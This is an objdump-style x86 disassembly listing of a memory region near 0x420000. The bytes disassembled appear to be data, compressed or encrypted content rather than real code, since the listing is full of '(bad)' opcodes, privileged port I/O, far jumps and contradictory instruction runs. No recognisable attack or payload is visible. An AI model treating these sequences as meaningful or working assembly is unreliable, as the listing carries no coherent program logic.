  4201d3:	pushf  
  4201d4:	sbb    ah,dh
  4201d6:	out    0x91,eax
  4201d8:	mov    dh,0x3f
  4201da:	retf   
  4201db:	ins    BYTE PTR es:[edi],dx
  4201dc:	ret    
  4201dd:	outs   dx,DWORD PTR ds:[esi]
  4201de:	sbb    al,0x96
  4201e0:	jae    0x42017b
  4201e2:	jmp    0x4201af
  4201e4:	mov    ah,0xca
  4201e6:	sbb    al,0x1a
  4201e8:	fcomp  QWORD PTR [eax-0x91a4274]
	...
  420256:	jae    0x420227
  420258:	fwait
  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx+0xf6c1899],1
  420266:	addr16 pop ecx
  420268:	add    DWORD PTR [eax],eax
  42026a:	add    BYTE PTR [ecx],al
  42026c:	add    BYTE PTR [eax],al
  42026e:	out    dx,al
  42026f:	inc    si
  420271:	and    al,0x55
  420273:	sbb    al,0x1d
  420275:	arpl   WORD PTR [ebx+0x3db88e8e],cx
  42027b:	and    DWORD PTR [edx-0x208da5ee],0xffffff88
  420282:	call   0x3b819e7d
  420287:	mov    ebx,0x9fc136c6
  42028c:	xchg   esi,eax
  42028d:	fimul  DWORD PTR es:[esi-0x51]
  420291:	dec    esi
  420292:	repz daa 
  420294:	aad    0xc8
  420296:	sub    bl,ch
  420298:	je     0x42022f
  42029a:	lahf   
  42029b:	sub    cl,BYTE PTR [eax]
  42029d:	sub    eax,0x147225f1
  4202a2:	mov    bl,0xba
  4202a4:	(bad)  
  4202a5:	in     al,dx
  4202a6:	adc    eax,0x1c79d210
  4202ab:	ret    0x589
  4202ae:	test   al,0x27
  4202b0:	bound  ebp,QWORD PTR [eax-0x67a3a55a]
  4202b6:	jg     0x4202a5
  4202b8:	leave  
  4202b9:	mov    bl,0xe0
  4202bb:	push   eax
  4202bc:	xchg   ecx,eax
  4202bd:	cmp    ah,BYTE PTR [edx-0x14bf6bc0]
  4202c3:	retf   0xaba5
  4202c6:	jl     0x420333
  4202c8:	imul   ebx,DWORD PTR [eax+0x17],0xffffff85
  4202cc:	ss xchg ebp,eax
  4202ce:	jg     0x420327
  4202d0:	es ins BYTE PTR es:[edi],dx
  4202d2:	je     0x420301
  4202d4:	sub    esi,esi
  4202d6:	push   eax
  4202d7:	mov    DWORD PTR [edi+0x73c8669e],esp
  4202dd:	aas    
  4202de:	pushf  
  4202df:	jl     0x4202be
  4202e1:	or     BYTE PTR [edi+0x6e39fa5],0xf
  4202e8:	sbb    DWORD PTR [ebp-0x226629d5],ecx
  4202ee:	xchg   ebx,eax
  4202ef:	in     eax,dx
  4202f0:	loop   0x42033d
  4202f2:	push   0x8000ec54
  4202f7:	adc    eax,0x5b60c424
  4202fc:	sub    eax,0xe8102988
  420301:	xchg   esi,eax
  420302:	mov    bl,0x9b
  420304:	pop    DWORD PTR [ebp+0x8]
  420307:	xchg   edi,eax
  420308:	pop    ecx
  420309:	ja     0x420362
  42030b:	mov    ds:0xe1b9a4f3,eax
  420310:	dec    eax
  420311:	ins    BYTE PTR es:[edi],dx
  420312:	add    BYTE PTR [ebp+0x19d097fc],cl
  420318:	adc    eax,0x198d5960
  42031d:	into   
  42031e:	dec    esp
  42031f:	jae    0x42037a
  420321:	fs pop esi
  420323:	or     ah,BYTE PTR [ebx+0x41]
  420326:	out    dx,eax
  420327:	sbb    DWORD PTR [esi-0x26],ebp
  42032a:	add    eax,0x1ae1427
  42032f:	ret    0x2357
  420332:	pop    edx
  420333:	sub    ebp,DWORD PTR ss:[esi+eax*4]
  420337:	arpl   WORD PTR ds:0x5ca8160,si
  42033d:	xor    ecx,DWORD PTR [ebx-0x2b22a183]
  420343:	xor    al,0xa4
  420345:	dec    esp
  420346:	sar    BYTE PTR [edi],cl
  420348:	push   ecx
  420349:	or     eax,0xd07e5674
  42034e:	fmul   st(4),st
  420350:	sbb    cl,BYTE PTR [ebx]
  420352:	and    esp,DWORD PTR [ecx+0x53e9426a]
  420358:	cld    
  420359:	leave  
  42035a:	(bad)  
  42035b:	sub    al,0x5f
  42035d:	or     BYTE PTR [esi+0x51],dh
  420360:	dec    ecx
  420361:	adc    BYTE PTR [ecx-0x5b],al
  420364:	adc    al,0xeb
  420366:	push   0xffffffe8
  420368:	(bad)  
  420369:	xchg   ecx,eax
  42036a:	(bad)  
  42036b:	fiadd  WORD PTR [ecx]
  42036d:	push   cs
	...
  4203d6:	inc    ecx
  4203d7:	push   es
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	pusha  
  4203e3:	sub    dh,ch
  4203e5:	loop   0x42044e
  4203e7:	pop    edx
  4203e8:	add    DWORD PTR [eax],eax
  4203ea:	add    BYTE PTR [ecx],al
  4203ec:	add    BYTE PTR [eax],al
  4203ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203ef:	xchg   edi,eax
  4203f0:	xor    al,0x32
  4203f2:	sub    al,0x22
  4203f4:	inc    edx
  4203f5:	pop    edx
  4203f6:	pop    edx
  4203f7:	shr    DWORD PTR [edx-0x17],1
  4203fa:	mov    ah,0x2c
  4203fc:	mov    cl,bh
  4203fe:	ins    BYTE PTR es:[edi],dx
  4203ff:	mov    ebx,0x2073478f
  420404:	imul   dl
  420406:	sbb    DWORD PTR [eax],esi
  420408:	mov    cl,dl
  42040a:	cmp    DWORD PTR [ebx+eax*2],ebx
  42040d:	mov    ds:0xc2d1c7a5,eax
  420412:	mov    eax,ds:0xa4b95810
  420417:	jno    0x42048c
  420419:	js     0x420458
  42041b:	push   ds
  42041c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42041d:	mov    al,ds:0x1516da89
  420422:	aam    0x9a
  420424:	sub    eax,0xf9646eba
  420429:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42042a:	(bad)  
  42042b:	cld    
  42042c:	aam    0x34
  42042e:	inc    ebx
  42042f:	dec    ebx
  420430:	scas   al,BYTE PTR es:[edi]
  420431:	ss int 0x60
  420434:	xlat   BYTE PTR ds:[ebx]
  420435:	dec    esi
  420436:	inc    edi
  420437:	mov    eax,ds:0x89733d75
  42043c:	(bad)  
  42043d:	or     eax,0x3a055430
  420442:	repz xor BYTE PTR [edx-0x27],0x7c
  420447:	jo     0x42042e
  420449:	xchg   edi,eax
  42044a:	fistp  QWORD PTR [ecx]
  42044c:	out    dx,al
  42044d:	adc    esi,DWORD PTR [ebx+0x4a]
  420450:	and    eax,0xba5bc638
  420455:	in     al,dx
  420456:	xor    eax,0x793a9242
  42045b:	push   es
  42045c:	sbb    al,BYTE PTR [eax+0x9]
  42045f:	pop    ecx
  420460:	pop    ss
  420461:	xchg   esp,eax
  420462:	js     0x420409
  420464:	mov    al,ds:0x2fc1e3c
  420469:	xchg   edi,eax
  42046a:	sub    esp,DWORD PTR [edi-0x22]
  42046d:	pop    ss
  42046e:	rcl    BYTE PTR [edi+0x54],cl
  420471:	sub    dh,BYTE PTR [edi]
  420473:	std    
  420474:	mov    bl,0xa5
  420476:	test   eax,0x69b45e09
  42047b:	inc    ebp
  42047c:	jle    0x420496
  42047e:	imul   esp,DWORD PTR [esi+0x6b],0xfd11bc29
  420485:	adc    dh,bl
  420487:	add    DWORD PTR [esi+0x4f],edx
  42048a:	ds adc ebp,0x311073a5
  420491:	inc    eax
  420492:	mov    ds:0xf5f30344,eax
  420497:	and    esi,DWORD PTR [edx-0x39]
  42049a:	push   eax
  42049c:	cmp    cl,bh
  42049e:	sbb    edx,eax
  4204a0:	inc    edx
  4204a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204a2:	aam    0x1b
  4204a4:	pop    eax
  4204a5:	hlt    
  4204a6:	stos   DWORD PTR es:[edi],eax
  4204a7:	call   0x9751:0xfd2c7c5e
  4204ae:	cli    
  4204af:	(bad)  
  4204b1:	shr    DWORD PTR [ebx],0xcc
  4204b4:	dec    ebp
  4204b5:	gs push edi
  4204b7:	lods   eax,DWORD PTR ds:[esi]
  4204b8:	stos   BYTE PTR es:[edi],al
  4204b9:	popf   
  4204ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204bb:	pop    edx
  4204bc:	leave  
  4204bd:	and    BYTE PTR [ecx+0x42],dl
  4204c0:	lods   al,BYTE PTR ds:[esi]
  4204c1:	outs   dx,DWORD PTR ds:[esi]
  4204c2:	push   0xeb5aa661
  4204c7:	mov    DWORD PTR [ebx+0x4d33a0dd],ebx
  4204cd:	or     bh,BYTE PTR [edi+0x60]
  4204d0:	ins    BYTE PTR es:[edi],dx
  4204d1:	xchg   edx,eax
  4204d2:	jae    0x42053f
  4204d4:	loope  0x420486
  4204d6:	sbb    eax,0xcf8d963a
  4204db:	scas   al,BYTE PTR es:[edi]
  4204dc:	and    al,0xe7
  4204de:	xchg   esi,eax
  4204df:	mov    al,ch
  4204e1:	lahf   
  4204e2:	push   0xffffffff
  4204e4:	fsubr  st,st(3)
  4204e6:	ins    DWORD PTR es:[edi],dx
  4204e7:	jbe    0x4204f6
  4204e9:	dec    eax
  4204ea:	lahf   
  4204eb:	fwait
  4204ec:	sub    BYTE PTR [edi+0x0],al
	...
  420553:	add    BYTE PTR [eax],al
  420555:	add    BYTE PTR [esi+0x7f125794],ch
  42055b:	shr    edi,cl
  42055d:	mov    esp,0x5a7f6c39
  420562:	ds ffreep st(7)
  420565:	dec    ecx
  420566:	addr16 pop ebx
  420568:	add    DWORD PTR [eax],eax
  42056a:	add    BYTE PTR [ecx],al
  42056c:	add    BYTE PTR [eax],al
  42056e:	in     al,dx
  42056f:	mov    edi,0x924d7b60
  420574:	(bad)  
  420575:	in     eax,dx
  420576:	lods   al,BYTE PTR ds:[esi]
  420577:	push   es
  420578:	jnp    0x42050d
  42057a:	dec    ebp
  42057b:	mov    DWORD PTR [edx-0x6c33d8c],esp
  420581:	dec    esi
  420582:	out    dx,eax
  420583:	jbe    0x42053d
  420585:	push   ds
  420586:	cdq    
  420587:	sub    DWORD PTR [edi],ebp
  420589:	in     eax,dx
  42058a:	dec    ebx
  42058b:	push   edi
  42058c:	jge    0x42053d
  42058e:	mov    al,0x79
  420590:	xor    ah,BYTE PTR [ebx-0x79]
  420593:	jno    0x4205bb
  420595:	daa    
  420596:	mov    ds:0xda1d54f5,eax
  42059b:	jmp    0xcb4b36cc
  4205a0:	mov    ch,0xb8
  4205a2:	push   ebx
  4205a3:	int    0xe8
  4205a5:	ins    BYTE PTR es:[edi],dx
  4205a6:	mov    eax,DWORD PTR [edx+0x2f]
  4205a9:	pop    ss
  4205aa:	jo     0x420547
  4205ac:	mov    al,ds:0x67008c26
  4205b1:	xchg   DWORD PTR [edx-0xbc19142],ebp
  4205b7:	in     al,0x50
  4205b9:	dec    edx
  4205ba:	adc    BYTE PTR [esi],0x65
  4205bd:	pop    ecx
  4205be:	cmp    dh,BYTE PTR [edi]
  4205c0:	fistp  DWORD PTR [esi-0x3f5eac81]
  4205c6:	mov    bl,0x2
  4205c8:	popa   
  4205c9:	mov    es,WORD PTR [eax]
  4205cb:	mov    DWORD PTR [edx],edx
  4205cd:	jne    0x3522acdb
  4205d3:	(bad)  
  4205d4:	jg     0x42061e
  4205d6:	jns    0x42063e
  4205d8:	inc    esi
  4205d9:	stos   DWORD PTR es:[edi],eax
  4205da:	mov    dh,0xe9
  4205dc:	fcmove st,st(7)
  4205de:	xchg   esi,eax
  4205df:	sbb    bl,BYTE PTR [edi+0x3b]
  4205e2:	int3   
  4205e3:	adc    al,0x48
  4205e5:	retf   0x628c
  4205e8:	fist   DWORD PTR [ebx]
  4205ea:	sbb    al,bh
  4205ec:	cdq    
  4205ed:	les    edi,FWORD PTR [eax+0x3dbb4644]
  4205f3:	dec    ebp
  4205f4:	jle    0x42057a
  4205f6:	lods   al,BYTE PTR ds:[esi]
  4205f7:	cmp    DWORD PTR [ebx+ebx*8+0x29],ebx
  4205fb:	shr    DWORD PTR [edi+0x1885f7f6],1
  420601:	pop    edx
  420602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420603:	test   DWORD PTR ds:0x477c296f,esp
  420609:	pop    eax
  42060a:	stos   BYTE PTR es:[edi],al
  42060b:	mov    esp,0x881a6c63
  420610:	test   al,0xad
  420612:	sbb    ecx,edx
  420614:	and    edx,DWORD PTR [esi]
  420616:	test   BYTE PTR [ebp-0x26],0x83
  42061a:	mov    esp,eax
  42061c:	sar    BYTE PTR [edi-0x7d17a2e2],0xe8
  420623:	cmp    eax,0xe74a84ac
  420628:	icebp  
  420629:	daa    
  42062a:	clc    
  42062b:	cdq    
  42062c:	fdivr  DWORD PTR [edi+0x5e]
  42062f:	jmp    0x2a950fb2
  420634:	jmp    0x8705:0x6b17a34b
  42063b:	lds    esi,FWORD PTR [ebp+0x4d4d1c54]
  420641:	rol    BYTE PTR [ecx+0x25],cl
  420644:	mov    cl,0xaa
  420646:	xor    al,0x63
  420648:	pop    ss
  420649:	popf   
  42064a:	fwait
  42064b:	test   BYTE PTR [ecx],0xb8
  42064e:	and    ecx,DWORD PTR [ebx]
  420650:	daa    
  420651:	mov    dl,0x8f
  420653:	je     0x42062b
  420655:	stc    
  420656:	xor    eax,0x7f9692f3
  42065b:	aaa    
  42065c:	adc    eax,0x7b00044
  420661:	mov    cl,0xd0
  420663:	ficomp DWORD PTR ds:0x30995f28
  420669:	mov    ebx,0x327af9ad
	...
  4206d6:	test   BYTE PTR [eax-0x48],ch
  4206d9:	or     ah,bh
  4206db:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  4206e2:	xor    al,0x9e
  4206e4:	mov    edx,DWORD PTR [ecx+0x15c67]
  4206ea:	add    BYTE PTR [ecx],al
  4206ec:	add    BYTE PTR [eax],al
  4206ee:	aas    
  4206ef:	jp     0x4206bf
  4206f1:	mov    BYTE PTR [eax+0x66],ch
  4206f4:	pop    edx
  4206f5:	aam    0xf
  4206f7:	enter  0x313,0x25
  4206fb:	lock add eax,0xa9e8d8f
  420701:	jmp    0x72fa:0x2fe5e640
  420708:	push   0xd2e9642a
  42070d:	mov    eax,DWORD PTR [esi+0x5c]
  420710:	pop    ecx
  420711:	test   eax,0x785dab51
  420716:	(bad)  
  420717:	jmp    0x2cfc:0x50e594a4
  42071e:	xor    al,0x3c
  420720:	stos   DWORD PTR es:[edi],eax
  420721:	repnz adc al,0xfb
  420724:	jmp    0x4206d7
  420726:	xor    cl,BYTE PTR [ebp-0x79968af0]
  42072c:	fidiv  WORD PTR [esp+eax*1]
  42072f:	xor    bh,dl
  420731:	push   esp
  420732:	ficomp WORD PTR [edx+0x218ef66a]
  420738:	or     dh,dh
  42073a:	in     eax,0x55
  42073c:	in     eax,dx
  42073d:	sbb    ecx,ebp
  42073f:	dec    ebp
  420740:	jb     0x420724
  420742:	sbb    al,0xf6
  420744:	add    ebp,DWORD PTR [eax+ecx*2+0x470ba8ff]
  42074b:	cmp    cl,0x46
  42074e:	inc    esp
  42074f:	dec    edx
  420750:	es ret 
  420752:	push   ss
  420753:	loope  0x4207c6
  420755:	cmp    bh,BYTE PTR [edi+0x7246d247]
  42075b:	and    al,0xa1
  42075d:	xor    al,0x38
  42075f:	jl     0x4207c7
  420761:	adc    eax,0x345a9bf8
  420766:	xchg   ebp,eax
  420767:	movntq (bad),mm6
  420768:	out    0xf5,eax
  42076a:	fistp  QWORD PTR [ebp-0x1d]
  42076d:	in     al,dx
  42076e:	imul   edx,DWORD PTR [esi+0x4ed5db7d],0xd263c8b1
  420778:	jb     0x42073f
  42077a:	or     esp,DWORD PTR [edx]
  42077c:	les    esp,FWORD PTR [ecx-0x60d927b6]
  420782:	cli    
  420783:	test   edi,ebp
  420785:	and    al,0xbd
  420787:	push   eax
  420788:	lock ja 0x420740
  42078b:	sub    dl,ah
  42078d:	inc    edx
  42078e:	adc    BYTE PTR [ebx+0xa],cl
  420791:	fadd   st(1),st
  420793:	and    eax,0x3ad3daaa
  420798:	push   ebp
  420799:	jnp    0x42073c
  42079b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42079c:	push   ss
  42079d:	jns    0x420739
  42079f:	and    edx,DWORD PTR [ecx+edi*2+0x12]
  4207a3:	jnp    0x420804
  4207a5:	cmp    eax,0xffad8fdb
  4207aa:	push   ds
  4207ab:	leave  
  4207ac:	xor    esp,edx
  4207ae:	and    DWORD PTR [ecx],edx
  4207b0:	int    0xd3
  4207b2:	mov    edx,DWORD PTR [edx]
  4207b4:	mov    cl,BYTE PTR [eax]
  4207b6:	scas   eax,DWORD PTR es:[edi]
  4207b7:	retf   0xbde1
  4207ba:	sub    ch,BYTE PTR [esp+edx*2+0x53]
  4207be:	cmp    edi,DWORD PTR [eax-0x25]
  4207c1:	add    BYTE PTR [edx+0x66c657c2],0x77
  4207c8:	imul   esi,DWORD PTR [ebx+0x90fc9d6],0xffffffe9
  4207cf:	adc    DWORD PTR [ecx],ebp
  4207d1:	ror    DWORD PTR [ecx-0x5032835],1
  4207d7:	std    
  4207d8:	push   ss
  4207d9:	or     al,0x38
  4207db:	cmp    al,0xa4
  4207dd:	iret   
  4207de:	inc    edx
  4207df:	mov    eax,ds:0xb37fc69b
  4207e4:	mov    bh,0x7e
  4207e6:	iret   
  4207e7:	mov    WORD PTR [edi+0x5d],gs
  4207ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207eb:	scas   eax,DWORD PTR es:[edi]
  4207ec:	mov    bh,0x72
	...
  420856:	mov    DWORD PTR [edi],ebp
  420858:	and    eax,0xad8aa780
  42085d:	das    
  42085e:	cmp    DWORD PTR [edi-0x24],ebp
  420861:	pusha  
  420862:	push   cs
  420863:	and    edi,edx
  420865:	push   0x67
  420867:	pop    ebp
  420868:	add    DWORD PTR [eax],eax
  42086a:	add    BYTE PTR [ecx],al
  42086c:	add    BYTE PTR [eax],al
  42086e:	adc    al,0xfa
  420870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420871:	call   0x9207:0x1922dcf0
  420878:	push   ecx
  420879:	cmp    dl,BYTE PTR [edi-0x31]
  42087c:	fidiv  DWORD PTR [ebp+0x1f]
  42087f:	repz xchg esp,eax
  420881:	test   al,0xfd
  420883:	sub    esi,edx
  420885:	ds std 
  420887:	mov    ds:0x8217f8b0,eax
  42088c:	lds    edx,FWORD PTR [ebp+0x4f]
  42088f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420890:	jnp    0x420904
  420892:	int    0x55
  420894:	cmp    al,0x68
  420896:	xor    BYTE PTR [edi],bh
  420898:	pop    esp
  420899:	stos   DWORD PTR es:[edi],eax
  42089a:	jnp    0x420828
  42089c:	ds out 0x3a,al
  42089f:	aaa    
  4208a0:	sbb    edx,DWORD PTR [esi-0x31]
  4208a3:	ds inc ebx
  4208a5:	call   0x83db:0xb3525093
  4208ac:	sbb    ebp,DWORD PTR [edi]
  4208ae:	cmp    esp,DWORD PTR [ebx-0x5a8b5837]
  4208b4:	push   bp
  4208b6:	out    0x74,al
  4208b8:	scas   eax,DWORD PTR es:[edi]
  4208b9:	xor    BYTE PTR [esi],al
  4208bb:	add    al,ch
  4208bd:	nop
  4208be:	(bad)  
  4208bf:	mov    edi,0x9a9ed9c
  4208c4:	mov    al,al
  4208c6:	test   DWORD PTR [edi],ebp
  4208c8:	adc    eax,0xcc377708
  4208cd:	and    DWORD PTR [ecx-0x71],ecx
  4208d0:	shl    bl,1
  4208d2:	mov    DWORD PTR [eax],esi
  4208d4:	jge    0x420892
  4208d6:	mov    ecx,0x9ea91d59
  4208db:	mov    ebx,esp
  4208dd:	mov    ah,0xb0
  4208df:	xchg   esi,eax
  4208e0:	jle    0x4208c2
  4208e2:	mov    edx,0xe6a7f08
  4208e7:	fcomp  DWORD PTR [esi+0x28]
  4208ea:	iret   
  4208eb:	cdq    
  4208ec:	adc    esi,DWORD PTR ds:0x2e35e5ca
  4208f2:	push   0x3d
  4208f4:	dec    esi
  4208f5:	or     DWORD PTR [edx-0x66c2d921],edx
  4208fb:	test   eax,0xb0ed1054
  420900:	xchg   ecx,ecx
  420902:	aaa    
  420903:	je     0x4208c8
  420905:	inc    eax
  420906:	in     eax,dx
  420907:	adc    DWORD PTR [ecx],0x35
  42090a:	nop
  42090b:	retf   0x6d36
  42090e:	(bad)  
  42090f:	leave  
  420910:	sub    eax,0x63782a33
  420915:	inc    eax
  420916:	in     al,dx
  420917:	daa    
  420918:	dec    esp
  420919:	xlat   BYTE PTR ds:[ebx]
  42091a:	jg     0x420946
  42091c:	sti    
  42091d:	sub    al,0x21
  42091f:	add    BYTE PTR [ebx-0x67ac82a5],bl
  420925:	mov    bl,0x11
  420927:	pusha  
  420928:	sbb    al,0x91
  42092a:	or     cl,al
  42092c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42092d:	aam    0xce
  42092f:	cld    
  420930:	sub    esp,DWORD PTR [edx+0x4ea359d4]
  420936:	inc    edx
  420937:	stos   DWORD PTR es:[edi],eax
  420938:	je     0x4208e1
  42093a:	add    ebx,DWORD PTR [edx]
  42093c:	push   esi
  42093d:	test   BYTE PTR [esp+edx*4-0x11f2f6d1],dh
  420944:	xchg   ebp,eax
  420945:	cmp    eax,0xfaabe1c0
  42094a:	pop    esp
  42094b:	pop    es
  42094c:	shl    ecx,1
  42094e:	adc    ch,dl
  420950:	inc    ebp
  420951:	scas   eax,DWORD PTR es:[edi]
  420952:	enter  0xf55b,0x6f
  420956:	mov    eax,ds:0xe87c3ef
  42095b:	cmp    eax,0x793909b
  420960:	fild   WORD PTR [ebx]
  420962:	inc    esp
  420963:	inc    esp
  420964:	sahf   
  420965:	or     al,0xa7
  420967:	xor    eax,0x139e9820
  42096c:	aad    0xcf
	...
  4209d6:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4209dd:	mov    ch,0xd2
  4209df:	ja     0x420a3f
  4209e1:	mov    dh,0x5e
  4209e3:	or     bh,0xca
  4209e6:	addr16 pop esi
  4209e8:	add    DWORD PTR [eax],eax
  4209ea:	add    BYTE PTR [ecx],al
  4209ec:	add    BYTE PTR [eax],al
  4209ee:	and    al,0x28
  4209f0:	das    
  4209f1:	or     ah,BYTE PTR [esi-0x7209e120]
  4209f7:	sub    al,dh
  4209f9:	lds    edx,FWORD PTR [edx-0x72]
  4209fc:	leave  
  4209fd:	jecxz  0x420a12
  4209ff:	(bad)  
  420a00:	das    
  420a01:	outs   dx,BYTE PTR ds:[esi]
  420a02:	push   edi
  420a03:	adc    al,0x81
  420a05:	(bad)  
  420a08:	cmp    al,0x71
  420a0a:	mov    ah,0xba
  420a0c:	mov    eax,0x3afbf208
  420a11:	cs ins DWORD PTR es:[edi],dx
  420a13:	mov    dh,0x8a
  420a15:	leave  
  420a16:	ins    BYTE PTR es:[edi],dx
  420a17:	or     DWORD PTR [ebp+0x66],ebp
  420a1a:	outs   dx,DWORD PTR ds:[esi]
  420a1b:	xchg   edx,eax
  420a1c:	mov    esi,0xdfca289
  420a21:	pop    es
  420a22:	xchg   edi,eax
  420a23:	xchg   BYTE PTR [edx+eax*2+0x4791c6e0],ah
  420a2a:	(bad)  
  420a2b:	repnz cld 
  420a2d:	cli    
  420a2e:	mov    ds:0xbf77eace,al
  420a33:	push   edx
  420a34:	scas   eax,DWORD PTR es:[edi]
  420a35:	jecxz  0x420a95
  420a37:	cwde   
  420a38:	adc    al,0x5c
  420a3a:	xlat   BYTE PTR ds:[ebx]
  420a3b:	xor    ebp,edx
  420a3d:	mov    dh,0xd7
  420a3f:	inc    ebp
  420a40:	mov    ch,0x90
  420a42:	xlat   BYTE PTR ds:[ebx]
  420a43:	shl    BYTE PTR [ebx-0xc],0x6d
  420a47:	jmp    0x420a6f
  420a49:	jmp    0x420a7d
  420a4b:	shl    DWORD PTR [edx],1
  420a4d:	cmp    BYTE PTR [ecx+0x6c],ah
  420a50:	add    DWORD PTR [eax+0x4614735b],edx
  420a56:	or     eax,DWORD PTR [esi+0x33]
  420a59:	(bad)  
  420a5a:	xchg   esi,eax
  420a5b:	dec    esp
  420a5c:	xchg   DWORD PTR [esi+0x4d],ebp
  420a5f:	jle    0x420a46
  420a61:	fisubr WORD PTR [ebp+0x2cbd325b]
  420a67:	sub    eax,0x649b434c
  420a6c:	cmp    al,0x6e
  420a6e:	push   ecx
  420a6f:	xchg   DWORD PTR [ebx],edx
  420a71:	call   0x535f00c5
  420a76:	lds    edx,FWORD PTR [ebp+0x62]
  420a79:	outs   dx,BYTE PTR ds:[esi]
  420a7a:	lods   eax,DWORD PTR ds:[esi]
  420a7b:	js     0x420a26
  420a7d:	out    0x8b,eax
  420a7f:	pop    ebp
  420a80:	test   BYTE PTR [edx],dl
  420a82:	fwait
  420a83:	ja     0x420ac1
  420a85:	neg    BYTE PTR [ebx]
  420a87:	fs mov esi,0x101bf646
  420a8d:	jge    0x420acc
  420a8f:	mov    esp,0x3ef57052
  420a94:	in     eax,dx
  420a95:	cmp    ebx,edi
  420a97:	(bad)  
  420a98:	(bad)
  420a9b:	and    DWORD PTR [edi-0x36],esp
  420a9e:	cmp    al,0x8e
  420aa0:	sbb    BYTE PTR [esi+0x5d907f8a],cl
  420aa6:	xor    DWORD PTR [edi+ebp*2-0x632f61f8],0x7824fe00
  420ab1:	add    BYTE PTR [ebx-0x54710480],0x5
  420ab8:	repz mov WORD PTR [ecx+0x68],gs
  420abc:	lods   eax,DWORD PTR ds:[esi]
  420abd:	cwde   
  420abe:	mov    cl,0xf3
  420ac0:	xor    ah,cl
  420ac2:	xchg   esi,eax
  420ac3:	sub    al,bl
  420ac5:	dec    ecx
  420ac6:	ficomp WORD PTR [edi]
  420ac8:	inc    ecx
  420ac9:	pop    ecx
  420aca:	fist   DWORD PTR [ebp+0x47ded973]
  420ad0:	ror    DWORD PTR [ebx],cl
  420ad2:	aaa    
  420ad3:	frstor [eax-0x34]
  420ad6:	out    0x25,ax
  420ad9:	sbb    eax,0xba3875ad
  420ade:	inc    ebx
  420adf:	push   ds
  420ae0:	test   eax,0xcb55d3b
  420ae5:	into   
  420ae6:	outs   dx,BYTE PTR ds:[esi]
  420ae7:	test   dl,cl
  420ae9:	inc    edi
  420aea:	mov    ebp,0x414aa7
	...
  420b53:	add    BYTE PTR [eax],al
  420b55:	add    bh,bl
  420b57:	xor    ch,BYTE PTR [edi-0x6010ed]
  420b5d:	(bad)  
  420b5e:	xlat   BYTE PTR ds:[ebx]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	cld    
  420b62:	add    eax,0x67c28171
  420b67:	pop    edi
  420b68:	add    DWORD PTR [eax],eax
  420b6a:	add    BYTE PTR [ecx],al
  420b6c:	add    BYTE PTR [eax],al
  420b6e:	mov    ebp,0x1e6bf4a5
  420b73:	sbb    eax,0x2ebb0ce4
  420b78:	hlt    
  420b79:	(bad)  
  420b7a:	enter  0xa50f,0x8
  420b7e:	add    edx,ebp
  420b80:	or     ebx,DWORD PTR [esi+0x2403c02c]
  420b86:	mov    bh,0xc1
  420b88:	aam    0xa5
  420b8a:	and    ch,BYTE PTR [ebx]
  420b8c:	js     0x420bee
  420b8e:	pusha  
  420b8f:	and    BYTE PTR [edx+ebx*2+0x45],ch
  420b93:	push   esp
  420b94:	inc    esp
  420b95:	(bad)  
  420b96:	fldenv ds:[edi+edx*1-0x3cf4f3b8]
  420b9e:	aad    0xc7
  420ba0:	popa   
  420ba1:	out    0x5f,eax
  420ba3:	jl     0x420bed
  420ba5:	scas   al,BYTE PTR es:[edi]
  420ba6:	out    0x76,al
  420ba8:	mov    ch,0xca
  420baa:	push   0x7b
  420bac:	loope  0x420b84
  420bae:	retf   
  420baf:	adc    edx,edi
  420bb1:	(bad)  
  420bb2:	call   0xf6e01c25
  420bb7:	cs int 0xb7
  420bba:	into   
  420bbb:	gs inc esp
  420bbd:	inc    edi
  420bbe:	mov    bh,0x7b
  420bc0:	pop    ecx
  420bc1:	cld    
  420bc2:	inc    esp
  420bc3:	jne    0x420b8f
  420bc5:	pop    edi
  420bc6:	cwde   
  420bc7:	movd   mm1,eax
  420bca:	in     al,0x79
  420bcc:	fisub  DWORD PTR [esi-0x319cc1ef]
  420bd2:	jne    0x420b90
  420bd4:	adc    ebx,DWORD PTR [ebx+0x77]
  420bd7:	daa    
  420bd8:	sub    DWORD PTR [ebp-0x667f3b56],ebx
  420bde:	arpl   dx,sp
  420be0:	ds aad 0x23
  420be3:	sbb    al,0x16
  420be5:	dec    edi
  420be6:	lahf   
  420be7:	test   eax,0xf8487c7c
  420bec:	lods   al,BYTE PTR ds:[esi]
  420bed:	inc    ecx
  420bee:	jle    0x420c19
  420bf0:	pop    ebp
  420bf1:	xlat   BYTE PTR ds:[ebx]
  420bf2:	ds repnz sbb ecx,eax
  420bf6:	cmc    
  420bf7:	ds mov ch,0x3c
  420bfa:	cdq    
  420bfb:	sbb    eax,0x277b0f8c
  420c00:	(bad)  
  420c01:	hlt    
  420c02:	pushf  
  420c03:	jo     0x420bcd
  420c05:	cld    
  420c06:	pop    esi
  420c07:	fmul   st,st(7)
  420c09:	lods   eax,DWORD PTR es:[esi]
  420c0b:	inc    eax
  420c0c:	pop    edx
  420c0d:	aaa    
  420c0e:	sbb    al,0x5c
  420c10:	idiv   BYTE PTR [ebp+0x32]
  420c13:	xchg   DWORD PTR [edi],esi
  420c15:	outs   dx,DWORD PTR ds:[esi]
  420c16:	pop    esp
  420c17:	in     eax,0xe
  420c19:	es in  al,0x1d
  420c1c:	sbb    eax,0x3a708acd
  420c21:	repz push edi
  420c23:	jmp    0x2acf:0x8cabb449
  420c2a:	outs   dx,BYTE PTR ds:[esi]
  420c2b:	cld    
